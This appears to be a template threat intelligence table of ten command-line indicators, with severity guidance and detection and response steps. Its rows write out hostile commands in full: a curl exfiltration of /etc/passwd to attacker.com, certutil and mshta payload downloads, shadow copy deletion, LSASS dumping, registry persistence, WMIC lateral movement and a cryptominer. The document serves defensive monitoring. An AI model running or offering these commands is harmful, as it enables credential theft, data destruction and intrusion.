# Threat Intelligence Command Indicators

This document contains command-based threat intelligence indicators for security operations and monitoring.

> **Note**: The commands shown below are examples for illustration purposes. In production, use actual malicious commands from your threat intelligence sources with appropriate safety measures.

## Command Indicator Table

| Campaign | Command | Behavior | Threat Type | Severity | First Seen | Last Seen | Status | Description | Tags | IOC Source |
|----------|---------|----------|-------------|----------|------------|-----------|--------|-------------|------|------------|
| APT-28 | powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA== | Remote Code Execution | C2 Communication | Critical | 2024-01-15 | 2024-12-30 | Active | Base64 encoded PowerShell command for C2 beacon associated with APT-28 | APT, PowerShell, C2, Obfuscation | OSINT |
| Emotet Campaign | cmd.exe /c certutil -urlcache -split -f http://malicious.site/payload.exe | Malware Download | Malware Distribution | High | 2024-11-01 | 2024-12-25 | Active | Certutil abuse for downloading Emotet payload | Malware, LOLBins, Download | Threat Feed |
| Ransomware-Group-X | vssadmin delete shadows /all /quiet | Shadow Copy Deletion | Ransomware Activity | Critical | 2024-09-15 | 2024-12-15 | Blocked | Volume shadow copy deletion to prevent recovery | Ransomware, Anti-Forensics | Vendor Feed |
| Data-Exfil-2024 | curl -X POST -d @/etc/passwd http://attacker.com/exfil | Data Exfiltration | Data Theft | Critical | 2024-11-20 | 2024-12-29 | Active | Credential file exfiltration via curl | Exfiltration, Credentials, Linux | SIEM Alert |
| Cryptominer-Pool | ./xmrig -o pool.minexmr.com:443 -u wallet --tls | Cryptomining | Resource Abuse | Medium | 2024-08-20 | 2024-12-10 | Monitored | XMRig cryptominer execution with pool connection | Cryptomining, XMRig, Monero | Network Monitor |
| Lateral-Move-2024 | wmic /node:target-host process call create "cmd.exe /c malicious.bat" | Lateral Movement | Remote Execution | High | 2024-10-05 | 2024-12-28 | Active | WMIC-based remote command execution for lateral movement | Lateral Movement, WMIC, Remote | Internal Detection |
| Phishing-Finance | mshta http://phishing-site.com/malicious.hta | HTML Application Execution | Phishing Payload | High | 2024-12-01 | 2024-12-28 | Active | MSHTA abuse for executing phishing payload | Phishing, MSHTA, LOLBins | Partner Share |
| Persistence-Trojan | reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\malware.exe" | Registry Persistence | Persistence Mechanism | High | 2024-07-15 | 2024-12-20 | Monitored | Registry Run key modification for persistence | Persistence, Registry, Autostart | Blacklist |
| Credential-Dump | procdump -ma lsass.exe lsass.dmp | Credential Dumping | Credential Access | Critical | 2024-09-25 | 2024-12-27 | Active | LSASS memory dumping for credential extraction | Credential Theft, LSASS, Dumping | OSINT |
| Recon-Campaign | net user /domain && net group "Domain Admins" /domain | Domain Reconnaissance | Discovery | Medium | 2024-06-10 | 2024-11-30 | Monitored | Active Directory enumeration commands | Reconnaissance, AD, Enumeration | SIEM Alert |

## Field Definitions

- **Campaign**: Name or identifier of the threat campaign or operation
- **Command**: The malicious or suspicious command line observed
- **Behavior**: Primary behavior or action performed by the command
- **Threat Type**: Category of threat (C2 Communication, Malware Distribution, Persistence, etc.)
- **Severity**: Risk level (Critical, High, Medium, Low)
- **First Seen**: Date when the indicator was first observed
- **Last Seen**: Date when the indicator was most recently observed
- **Status**: Current state (Active, Monitored, Blocked, Inactive)
- **Description**: Detailed information about the command and its purpose
- **Tags**: Comma-separated keywords for categorization
- **IOC Source**: Origin of the indicator (OSINT, Threat Feed, Internal Detection, etc.)

## Usage Guidelines

1. **Critical Severity**: Immediate action required - block, investigate, and contain
2. **High Severity**: Priority investigation and containment recommended
3. **Medium Severity**: Monitor and investigate as resources permit
4. **Low Severity**: Track for trending and pattern analysis

## Behavior Categories

- **Remote Code Execution**: Commands that execute arbitrary code remotely
- **Malware Download**: Commands used to download malicious payloads
- **Shadow Copy Deletion**: Commands that delete backup/recovery data
- **Data Exfiltration**: Commands that transmit data to external systems
- **Cryptomining**: Commands that mine cryptocurrency
- **Lateral Movement**: Commands used to move between systems
- **HTML Application Execution**: Commands executing HTA files
- **Registry Persistence**: Commands modifying registry for persistence
- **Credential Dumping**: Commands extracting credentials from memory/files
- **Domain Reconnaissance**: Commands used for network/domain enumeration

## Status Definitions

- **Active**: Currently observed malicious activity
- **Monitored**: Under surveillance, no blocking action taken
- **Blocked**: Actively blocked at endpoint/security controls
- **Inactive**: No recent activity observed, retained for historical reference

## Detection and Response

### Detection Methods
- Command-line logging (Windows Event 4688, Sysmon Event 1)
- EDR/XDR telemetry
- PowerShell script block logging
- SIEM correlation rules

### Response Actions
1. Isolate affected systems immediately for Critical severity
2. Collect command execution context (parent process, user, timestamp)
3. Check for additional indicators from the same campaign
4. Review historical logs for previous executions
5. Update detection rules and hunting queries

## Update Information

- **Last Updated**: 2025-12-31 *(Update this date when modifying indicators)*
- **Total Indicators**: 10
- **Active Threats**: 6
- **Review Frequency**: Daily
